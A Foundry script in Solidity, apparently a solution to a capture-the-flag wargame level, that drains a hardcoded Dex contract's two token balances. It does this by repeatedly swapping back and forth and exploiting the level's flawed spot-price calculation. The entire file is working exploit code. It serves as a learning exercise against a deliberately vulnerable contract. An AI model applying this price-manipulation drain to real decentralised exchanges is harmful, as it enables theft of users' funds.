pragma solidity ^0.8.0;
import "../instances/Ilevel22.sol";
import "forge-std/Script.sol";

contract Level22 is Script {
    Dex level22 = Dex(0xCe7b64B4f8DB692395e8CEC526535466d5FA821D);
    address attacker;
    address token1;
    address token2;

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        token1 = level22.token1();
        token2 = level22.token2();
        // approve all
        IERC20(token1).approve(address(level22), type(uint256).max);
        IERC20(token2).approve(address(level22), type(uint256).max);
        console.log("Balance of attacker before: ");
        this.showBalance(attacker);
        console.log("Balance of dex before: ");
        this.showBalance(address(level22));
        address _tokenFrom = token1;
        address _tokenTo = token2;
        console.log("Blance of dex while exploit: ");
        while (
            IERC20(token1).balanceOf(address(level22)) != 0 &&
            IERC20(token2).balanceOf(address(level22)) != 0
        ) {
            monoSwap(_tokenFrom, _tokenTo);
            this.showBalance(address(level22));
            (_tokenFrom, _tokenTo) = (_tokenTo, _tokenFrom);
        }
        console.log("Balance of attacker after: ");
        this.showBalance(attacker);
        console.log("Balance of dex after: ");
        this.showBalance(address(level22));
        vm.stopBroadcast();
    }

    function monoSwap(address _tokenFrom, address _tokenTo) public {
        uint256 remainedAmountDex = IERC20(_tokenTo).balanceOf(
            address(level22)
        );
        uint256 currentUserBalance = IERC20(_tokenFrom).balanceOf(attacker);
        uint256 neededAmount = (remainedAmountDex *
            IERC20(_tokenFrom).balanceOf(address(level22))) /
            IERC20(_tokenTo).balanceOf(address(level22));
        uint256 swapAmount = neededAmount > currentUserBalance
            ? currentUserBalance
            : neededAmount;
        level22.swap(_tokenFrom, _tokenTo, swapAmount);
    }

    function showBalance(address _address) external view {
        console.log("Token 1 balance: ", IERC20(token1).balanceOf(_address));
        console.log("Token 2 balance: ", IERC20(token2).balanceOf(_address));
    }
}
